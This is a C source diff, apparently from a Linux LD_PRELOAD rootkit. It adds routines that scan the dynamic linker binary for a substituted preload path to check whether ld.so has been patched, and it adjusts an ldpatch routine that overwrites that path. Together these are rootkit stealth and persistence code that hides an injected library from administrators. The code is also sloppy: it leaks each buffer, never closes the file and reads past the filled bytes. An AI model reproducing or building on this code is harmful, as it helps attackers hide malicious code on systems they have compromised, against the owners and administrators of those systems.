@@ -1,3 +1,66 @@
+/* searches one ld.so path from ldfind for newpreload.
+ * returns 1 if ld.so has been patched.
+ * return 0 if it has not.
+ * returns -1 on error. */
+int _ispatched(const char *path, const char *newpreload){
+    unsigned char *buf;
+    FILE *ofp;
+    off_t fsize;
+    size_t n, plen=strlen(newpreload);
+
+    hook(CFOPEN, CFWRITE);
+
+    // bindup ignores links.
+    ofp = call(CFOPEN, path, "rb");
+    if(ofp == NULL) return -1;
+    fsize = getfilesize(path)/2;
+
+    int count = 0;
+
+    do{
+        buf = malloc(fsize+1);
+        if(!buf){
+            fclose(ofp);
+            return -1;
+        }
+        memset(buf, 0, fsize+1);
+        n = fread(buf, 1, fsize, ofp);
+        if(n){
+            for(int i = 0; i <= fsize; i++){
+                if(buf[i] == newpreload[count]){
+                    if(count == plen)
+                        break;
+                    count++;
+                }else count=0;
+            }
+        }else n = 0;
+    }while(n > 0 && count != plen);
+
+    if(count != plen)
+        return 0;
+
+    return 1;
+}
+
+
+int ispatched(const char *newpreload){
+    char **foundld;
+    int allf, p, is=0;
+
+    foundld = ldfind(&allf, 1);
+    if(foundld == NULL)
+        return -1;
+
+    p = _ispatched(foundld[0], newpreload);
+    if(p > -1) free(foundld[0]);
+    if(p < 0) is=-1;
+    if(p) is=1;
+
+    free(foundld);
+    return is;
+}
+
+
 /* overwrites, in the contents of path, whatever oldpreload contains with whatever newpreload contains.
  * if the return value is 0 then either:
  *    bindup failed. presumably because path doesn't exist.
@@ -81,7 +144,7 @@ int ldpatch(const char *oldpreload, const char *newpreload){
     char **foundld;
     int allf, p, c=0;
 
-    foundld = ldfind(&allf);
+    foundld = ldfind(&allf, MAXLDS);
     if(foundld == NULL)
         return -3;
 
